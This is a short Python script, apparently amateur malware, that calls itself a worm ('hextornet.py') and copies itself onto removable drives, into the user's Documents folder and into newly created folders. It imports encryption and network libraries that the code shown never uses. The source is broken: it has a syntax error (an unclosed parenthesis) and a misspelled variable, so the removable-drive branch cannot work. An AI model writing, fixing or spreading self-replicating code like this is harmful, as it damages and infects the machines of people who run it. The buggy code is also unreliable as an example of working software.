#!/usr/bin/env python

from shutil import copyfile
import os, getpass
from sys import argv
#import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil

def propagate():
	#gets the current location of the worm
	src = os.path.abspath("hextornet.py")
	
	usr = getpass.getuser()
	
	if(os.path.isdir("E:\\")):
		dts = "E:" + "\\hextornet.py"
		print(dts)

	#checks for Documents folder in Linux
	elif(os.path.isdir("/home/" + usr + "/Documents/")):
		dst = "/home/" + usr + "/Documents/" + "hextornet.py"
	
	#checks for Documents folder in Windows
	elif(os.path.isdir("C:\\Users\\" + usr + "\\Documents")):
		dst = "C:\\Users\\" + usr + "\\Documents\\"+"hextornet.py"

	#checks for C:/ drive on windows
	elif(os.path.isdir("C:\\")):
		dst = "C:\\Users\\" + usr + "\\hextornet.py"

	else:
		dst = os.getcwd() + "hextornet.py"

	copyfile(src, dst)
	print("Worm location")
	print("dst:", dst)
	print("src:", src)

def copy():
	script = argv
	name = str(script[0]
	b = os.path.getsize(os.path.abspath("C:"))
	for i in range(0, 4):
		directoryName = "copy"+str(i)
		os.mkdir(directoryName)
		shutil.copy(name, directoryName)
		src = os.path.abspath(directoryName)

propagate()
